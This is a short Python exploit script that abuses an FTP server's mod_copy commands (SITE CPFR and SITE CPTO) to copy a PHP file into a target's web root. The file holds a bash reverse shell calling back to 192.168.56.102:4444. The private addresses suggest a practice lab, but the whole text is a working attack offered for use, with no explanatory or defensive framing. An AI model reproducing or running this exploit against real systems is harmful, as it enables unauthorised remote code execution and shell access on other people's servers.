from ftplib import FTP

target_ip = "192.168.56.101"
payload_name = "rev.php"
payload_path = f"/tmp/{payload_name}"
web_root_path = f"/var/www/html/{payload_name}"

# reverse shell payload content (edit IP & port)
reverse_shell = """<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/4444 0>&1'");
?>"""

# Save payload locally (for reference)
with open(payload_name, "w") as f:
    f.write(reverse_shell)

print("[*] Payload written as rev.php")

# Manually place rev.php into /tmp using existing FTP tricks or SSH access
# Then use mod_copy to place it in web root
ftp = FTP()
ftp.connect(target_ip, 21)

print("[*] Using mod_copy commands...")

# Copy from /tmp to web root
resp1 = ftp.sendcmd(f"SITE CPFR {payload_path}")
print("[+] CPFR:", resp1)

resp2 = ftp.sendcmd(f"SITE CPTO {web_root_path}")
print("[+] CPTO:", resp2)

ftp.quit()
print("[*] Exploit complete. Trigger the payload at: http://{}/{}".format(target_ip, payload_name))
